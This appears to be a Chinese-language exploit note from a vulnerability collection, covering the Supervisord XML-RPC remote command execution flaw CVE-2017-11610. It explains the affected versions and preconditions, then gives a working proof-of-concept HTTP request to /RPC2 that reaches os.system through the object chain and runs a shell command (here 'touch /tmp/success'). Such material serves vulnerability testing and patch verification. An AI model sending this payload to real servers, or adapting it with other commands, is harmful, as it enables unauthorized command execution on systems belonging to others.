## Supervisord远程命令执行漏洞脚本（CVE-2017-11610）

### 漏洞简介

Supervisor 是一个用 Python 写的进程管理工具，可以很方便的用来在 UNIX-like 系统（不支持 Windows）下启动、重启（自动重启程序）、关闭进程（不仅仅是 Python 进程）

Supervisor 是一个 C/S 模型的程序，supervisord 是 server 端，supervisorctl 是 client 端，简单理解就是client输入supervisor的指令调用server端的API从而完成一些工作。

而Supervisor的Web的服务其实很多人会用的比较多，也就是supervisord的客户端，只要路由通，即可远程通过Web页面完成类似于supervisor的client端的操作。而通过Web界面的操作由XML-RPC接口实现，该漏洞也是出在XML-RPC接口对数据的处理上。



### 利用条件


Supervisor version 3.1.2至Supervisor version 3.3.2

开启Web服务且9001端口可被访问

密码为弱密码或空口令

### POC

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 213

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/success</string>
</param>
</params>
</methodCall>
```

该poc无回显

### 回显脚本

![a](./img/a.png)